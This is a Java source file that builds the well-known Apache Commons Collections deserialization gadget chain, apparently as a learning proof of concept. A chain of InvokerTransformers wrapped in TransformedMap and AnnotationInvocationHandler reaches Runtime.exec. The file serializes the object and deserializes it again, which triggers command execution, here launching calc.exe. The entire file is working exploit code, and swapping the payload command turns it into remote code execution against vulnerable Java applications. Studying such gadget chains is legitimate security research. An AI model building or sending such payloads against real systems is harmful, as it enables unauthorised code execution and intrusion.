package Serialize2;


import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class ApacheSerialize2 implements Serializable {
    public static void main(String[] args) throws Exception{
         Transformer[] transformers = new Transformer[]{
                 new ConstantTransformer(Runtime.class),
                 new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                 new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                 new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
         };
         Transformer transformerChain = new ChainedTransformer(transformers);

         Map map = new HashMap();
         map.put("value", "sijidou");
         Map transformedMap = TransformedMap.decorate(map, null, transformerChain);

         Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
         Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
         ctor.setAccessible(true);
         Object instance = ctor.newInstance(Target.class, transformedMap);

         //序列化
         FileOutputStream fileOutputStream = new FileOutputStream("serialize3.txt");
         ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
         objectOutputStream.writeObject(instance);
         objectOutputStream.close();

         //反序列化
         FileInputStream fileInputStream = new FileInputStream("serialize3.txt");
         ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
         Object result = objectInputStream.readObject();
         objectInputStream.close();
         System.out.println(result);
    }
}